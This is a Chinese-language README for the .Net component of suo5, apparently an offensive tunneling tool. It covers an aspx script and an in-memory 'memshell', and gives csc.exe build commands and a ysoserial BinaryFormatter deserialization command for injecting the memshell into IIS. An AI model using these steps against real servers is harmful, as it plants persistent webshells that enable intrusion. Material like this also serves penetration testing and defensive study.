# .Net

运行环境: .Net Framework >= 2.0; .NetCore; .Net

| 文件                   | 全双工 | 半双工 | 负载转发 | 备注                   |
|:---------------------|:---:|:---:|:----:|:---------------------|
| `suo5.aspx`          |  x  |  ✓  |  ✓   | 常规 aspx 脚本           |
| `Suo5VirtualPath.cs` |  x  |  ✓  |  ✓   | .Net VirtualPath 内存马 |

1. `.Net` 全双工的实现主要卡在了流式的请求传输上，我发现在 `.Net` 中必须等到请求的 `Body` 结束才能在 aspx 脚本内拿到
   `Request` 对象，这就导致了无法在请求过程中进行响应，因此只能使用半双工的方式来实现。
   如通过你有思路突破这个限制，欢迎与我讨论
2. 脚本中有一个对服务线程池调整的逻辑，至少会调整为 256，如果并发数超过这个数量，请求会变得很慢，这和 IIS 的请求模型有关。
   如果你需要更大的并发，需要把这个值改大一些。

## 使用 .Net 内存马

> 感谢 [@dust-life](https://github.com/dust-life) 贡献

参考: https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs

### 编译

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:library Suo5VirtualPath.cs
```

or

```
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /t:library Suo5VirtualPath.cs
```

### 使用

```
https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/install.aspx
```

or

```
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "Suo5VirtualPath.cs;System.Web.dll;System.dll"
```

